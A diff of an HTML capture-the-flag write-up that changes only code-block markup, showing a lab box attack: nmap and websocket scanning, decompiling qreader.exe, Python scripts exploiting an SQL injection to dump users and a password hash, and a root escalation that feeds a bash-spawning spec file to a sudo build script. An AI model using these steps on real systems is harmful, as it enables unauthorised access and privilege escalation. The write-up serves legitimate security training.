@@ -169,7 +169,7 @@ body {
 <code><span class="ve">❯ command </span><span class="p">used
 sudo nmap -sV -sC -A 10.10.11.206
   </span>
-</code></pre></div></div><br>          
+</code></pre></div></div>         
           
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*17K1xym-FAzLGeA0.png" alt=""></p>
 <p><strong>Scan Result:</strong></p>
@@ -178,11 +178,12 @@ sudo nmap -sV -sC -A 10.10.11.206
 <p>Websocket on port 5789</p>
 <p>let’s do a vulnerability scan of websocket in port 5789 with  <a href="https://github.com/PalindromeLabs/STEWS">STEWS</a></p>
 <p>GitHub - PalindromeLabs/STEWS: A Security Tool for Enumerating WebSockets</p>
-          
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">          
 <code><span class="ve">❯ command </span><span class="p">used
 python3 STEWS-vuln-detect.py -1 -n -u 10.10.11.206:5789
   </span>
-</code></pre></div></div><br>           
+</code></pre></div></div>         
           
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*7urD5zisq7WEzgUu.png" alt=""></p>
 <p>We came to know about a vulnerable url which is  <strong>ws://qreader.htb:5789</strong></p>
@@ -194,26 +195,29 @@ python3 STEWS-vuln-detect.py -1 -n -u 10.10.11.206:5789
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*pou0qWZvghBwUIOm.png" alt=""></p>
 <p>Also we can download the software for windows and linux so, let’s download the .exe file and decompile it using  <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a>.</p>
 <p>GitHub - extremecoders-re/pyinstxtractor: PyInstaller Extractor</p>
-  
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">          
 <code><span class="ve">❯ command </span><span class="p">used
 python3 pyinstxtractor.py qreader.exe
   </span>
-</code></pre></div></div><br>   
+</code></pre></div></div>  
   
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*4NGSjNybLp9Qam1C.png" alt=""></p>
 <p>Now go to extracted folder &amp; and examine the qreader.pyc file.</p>
 
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">          
 <code><span class="ve">❯ command </span><span class="p">used
 pip3 install uncompyle6
 
 uncompyle6 qreader.pyc > qreader.py
   </span>
-</code></pre></div></div><br> 
+</code></pre></div></div>
 
 <p>After analyzing the qreader.py file we found the vulnerability as you can see below.</p>
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*xCCvX9ZxTyzgUTM9.png" alt=""></p>
 <p>Let’s make a python script to exploit the SQL Injection found in the above source code.</p>
 
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">          
 <code><span class="ve">❯ code </span><span class="p">-->
 from websocket import create_connection
 import json
@@ -225,12 +229,13 @@ result = ws.recv()
 print(result)
 ws.close()
   </span>
-</code></pre></div></div><br> 
+</code></pre></div></div> 
 
 <p>Above code will print all the user as shown below.</p>
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*hB3PqA9MMkATMzL0.png" alt=""></p>
 <p>Lets write a code to print password of user.</p>
 
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">          
 <code><span class="ve">❯ code </span><span class="p">-->
 from websocket import create_connection
 import json
@@ -242,7 +247,7 @@ result = ws.recv()
 print(result)
 ws.close()
   </span>
-</code></pre></div></div><br> 
+</code></pre></div></div> 
 
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*RD0P0UrNL-iKcntz.png" alt=""></p>
 <p>As you can see we got our password and we can decrypt this at crackstation.net website as shown below.</p>
@@ -256,13 +261,14 @@ ws.close()
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*4WIcr7_wT1JWZ4g0.png" alt=""></p>
 <p>Command used</p>
 
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">          
 <code><span class="ve">❯ code </span><span class="p">-->
 echo 'import os;os.system("/bin/bash")' > root.spec
 
 sudo /usr/local/sbin/build-installer.sh build root.spec
   </span>
-</code></pre></div></div><br> 
-
+</code></pre></div></div>
+          
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*pzmMd1xHQNkTyuC9.png" alt=""></p>
 <p>As you can see we got our root flag.</p>
 <p><strong>Thankyou For Reading.</strong></p>
